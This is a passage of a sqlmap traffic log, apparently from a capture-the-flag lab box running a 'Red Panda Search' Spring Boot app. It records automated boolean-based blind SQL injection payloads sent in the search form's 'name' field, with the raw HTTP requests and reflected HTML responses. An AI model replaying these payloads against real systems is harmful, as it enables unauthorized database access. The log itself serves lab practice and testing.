+[12:50:44] [TRAFFIC IN] HTTP response [#93] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:44 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' WHERE 1334=1334 AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- ISIA</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:44] [PAYLOAD] woodenk') AS sqfz WHERE 4308=4308 AND 5542=(SELECT (CASE WHEN (5542=1575) THEN 5542 ELSE (SELECT 1575 UNION SELECT 9382) END))-- oHVS
+[12:50:44] [TRAFFIC OUT] HTTP request [#94]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 202
+Connection: close
+
+name=woodenk%27%29%20AS%20sqfz%20WHERE%204308%3D4308%20AND%205542%3D%28SELECT%20%28CASE%20WHEN%20%285542%3D1575%29%20THEN%205542%20ELSE%20%28SELECT%201575%20UNION%20SELECT%209382%29%20END%29%29--%20oHVS
+
+[12:50:45] [TRAFFIC IN] HTTP response [#94] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:44 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk') AS sqfz WHERE 4308=4308 AND 5542=(SELECT (CASE WHEN (5542=1575) THEN 5542 ELSE (SELECT 1575 UNION SELECT 9382) END))-- oHVS</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:45] [PAYLOAD] woodenk') AS xvrH WHERE 5607=5607 AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- zkuW
+[12:50:45] [TRAFFIC OUT] HTTP request [#95]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 202
+Connection: close
+
+name=woodenk%27%29%20AS%20xvrH%20WHERE%205607%3D5607%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20zkuW
+
+[12:50:45] [TRAFFIC IN] HTTP response [#95] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:44 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk') AS xvrH WHERE 5607=5607 AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- zkuW</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:45] [PAYLOAD] woodenk' IN BOOLEAN MODE) AND 7063=(SELECT (CASE WHEN (7063=6389) THEN 7063 ELSE (SELECT 6389 UNION SELECT 7919) END))-- uaVP
+[12:50:45] [TRAFFIC OUT] HTTP request [#96]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 190
+Connection: close
+
+name=woodenk%27%20IN%20BOOLEAN%20MODE%29%20AND%207063%3D%28SELECT%20%28CASE%20WHEN%20%287063%3D6389%29%20THEN%207063%20ELSE%20%28SELECT%206389%20UNION%20SELECT%207919%29%20END%29%29--%20uaVP
+
+[12:50:45] [TRAFFIC IN] HTTP response [#96] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:44 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' IN BOOLEAN MODE) AND 7063=(SELECT (CASE WHEN (7063=6389) THEN 7063 ELSE (SELECT 6389 UNION SELECT 7919) END))-- uaVP</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:45] [PAYLOAD] woodenk' IN BOOLEAN MODE) AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- NHhs
+[12:50:45] [TRAFFIC OUT] HTTP request [#97]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 190
+Connection: close
+
+name=woodenk%27%20IN%20BOOLEAN%20MODE%29%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20NHhs
+
+[12:50:45] [TRAFFIC IN] HTTP response [#97] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:44 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' IN BOOLEAN MODE) AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- NHhs</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:45] [PAYLOAD] woodenk) AND 6718=(SELECT (CASE WHEN (6718=3445) THEN 6718 ELSE (SELECT 3445 UNION SELECT 9638) END))-- eBQX
+[12:50:45] [TRAFFIC OUT] HTTP request [#98]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 165
+Connection: close
+
+name=woodenk%29%20AND%206718%3D%28SELECT%20%28CASE%20WHEN%20%286718%3D3445%29%20THEN%206718%20ELSE%20%28SELECT%203445%20UNION%20SELECT%209638%29%20END%29%29--%20eBQX
+
+[12:50:45] [TRAFFIC IN] HTTP response [#98] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:45 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk) AND 6718=(SELECT (CASE WHEN (6718=3445) THEN 6718 ELSE (SELECT 3445 UNION SELECT 9638) END))-- eBQX</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:45] [PAYLOAD] woodenk) AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- fyFS
+[12:50:45] [TRAFFIC OUT] HTTP request [#99]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 165
+Connection: close
+
+name=woodenk%29%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20fyFS
+
+[12:50:46] [TRAFFIC IN] HTTP response [#99] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:45 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk) AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- fyFS</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:46] [PAYLOAD] woodenk)) AND 6495=(SELECT (CASE WHEN (6495=5357) THEN 6495 ELSE (SELECT 5357 UNION SELECT 2563) END))-- JvwU
+[12:50:46] [TRAFFIC OUT] HTTP request [#100]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 168
+Connection: close
+
+name=woodenk%29%29%20AND%206495%3D%28SELECT%20%28CASE%20WHEN%20%286495%3D5357%29%20THEN%206495%20ELSE%20%28SELECT%205357%20UNION%20SELECT%202563%29%20END%29%29--%20JvwU
+
+[12:50:46] [TRAFFIC IN] HTTP response [#100] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:45 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk)) AND 6495=(SELECT (CASE WHEN (6495=5357) THEN 6495 ELSE (SELECT 5357 UNION SELECT 2563) END))-- JvwU</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:46] [PAYLOAD] woodenk)) AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- RJjr
+[12:50:46] [TRAFFIC OUT] HTTP request [#101]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 168
+Connection: close
+
+name=woodenk%29%29%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20RJjr
+
+[12:50:46] [TRAFFIC IN] HTTP response [#101] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:45 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk)) AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- RJjr</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:46] [PAYLOAD] woodenk))) AND 7125=(SELECT (CASE WHEN (7125=9938) THEN 7125 ELSE (SELECT 9938 UNION SELECT 8604) END))-- lRQt
+[12:50:46] [TRAFFIC OUT] HTTP request [#102]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 171
+Connection: close
+
+name=woodenk%29%29%29%20AND%207125%3D%28SELECT%20%28CASE%20WHEN%20%287125%3D9938%29%20THEN%207125%20ELSE%20%28SELECT%209938%20UNION%20SELECT%208604%29%20END%29%29--%20lRQt
+
+[12:50:46] [TRAFFIC IN] HTTP response [#102] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:45 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk))) AND 7125=(SELECT (CASE WHEN (7125=9938) THEN 7125 ELSE (SELECT 9938 UNION SELECT 8604) END))-- lRQt</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:46] [PAYLOAD] woodenk))) AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- IVXW
+[12:50:46] [TRAFFIC OUT] HTTP request [#103]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 171
+Connection: close
+
+name=woodenk%29%29%29%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20IVXW
+
+[12:50:46] [TRAFFIC IN] HTTP response [#103] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:45 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk))) AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- IVXW</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:46] [PAYLOAD] woodenk AND 4757=(SELECT (CASE WHEN (4757=5446) THEN 4757 ELSE (SELECT 5446 UNION SELECT 7851) END))-- UZIB
+[12:50:46] [TRAFFIC OUT] HTTP request [#104]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 162
+Connection: close
+
+name=woodenk%20AND%204757%3D%28SELECT%20%28CASE%20WHEN%20%284757%3D5446%29%20THEN%204757%20ELSE%20%28SELECT%205446%20UNION%20SELECT%207851%29%20END%29%29--%20UZIB
+
+[12:50:46] [TRAFFIC IN] HTTP response [#104] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:46 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk AND 4757=(SELECT (CASE WHEN (4757=5446) THEN 4757 ELSE (SELECT 5446 UNION SELECT 7851) END))-- UZIB</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:46] [PAYLOAD] woodenk AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- HbeX
+[12:50:46] [TRAFFIC OUT] HTTP request [#105]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 162
+Connection: close
+
+name=woodenk%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20HbeX
+
+[12:50:47] [TRAFFIC IN] HTTP response [#105] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:46 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- HbeX</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:47] [PAYLOAD] woodenk) WHERE 7486=7486 AND 8428=(SELECT (CASE WHEN (8428=7071) THEN 8428 ELSE (SELECT 7071 UNION SELECT 2344) END))-- CycO
+[12:50:47] [TRAFFIC OUT] HTTP request [#106]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 187
+Connection: close
+
+name=woodenk%29%20WHERE%207486%3D7486%20AND%208428%3D%28SELECT%20%28CASE%20WHEN%20%288428%3D7071%29%20THEN%208428%20ELSE%20%28SELECT%207071%20UNION%20SELECT%202344%29%20END%29%29--%20CycO
+
+[12:50:47] [TRAFFIC IN] HTTP response [#106] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:46 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk) WHERE 7486=7486 AND 8428=(SELECT (CASE WHEN (8428=7071) THEN 8428 ELSE (SELECT 7071 UNION SELECT 2344) END))-- CycO</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:47] [PAYLOAD] woodenk) WHERE 8657=8657 AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- uKIg
+[12:50:47] [TRAFFIC OUT] HTTP request [#107]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 187
+Connection: close
+
+name=woodenk%29%20WHERE%208657%3D8657%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20uKIg
+
+[12:50:47] [TRAFFIC IN] HTTP response [#107] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:46 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk) WHERE 8657=8657 AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- uKIg</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:47] [PAYLOAD] woodenk WHERE 5394=5394 AND 8574=(SELECT (CASE WHEN (8574=7412) THEN 8574 ELSE (SELECT 7412 UNION SELECT 9054) END))-- WhPb
+[12:50:47] [TRAFFIC OUT] HTTP request [#108]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 184
+Connection: close
+
+name=woodenk%20WHERE%205394%3D5394%20AND%208574%3D%28SELECT%20%28CASE%20WHEN%20%288574%3D7412%29%20THEN%208574%20ELSE%20%28SELECT%207412%20UNION%20SELECT%209054%29%20END%29%29--%20WhPb
+
+[12:50:47] [TRAFFIC IN] HTTP response [#108] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:46 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk WHERE 5394=5394 AND 8574=(SELECT (CASE WHEN (8574=7412) THEN 8574 ELSE (SELECT 7412 UNION SELECT 9054) END))-- WhPb</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:47] [PAYLOAD] woodenk WHERE 1405=1405 AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- OQIx
+[12:50:47] [TRAFFIC OUT] HTTP request [#109]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 184
+Connection: close
+
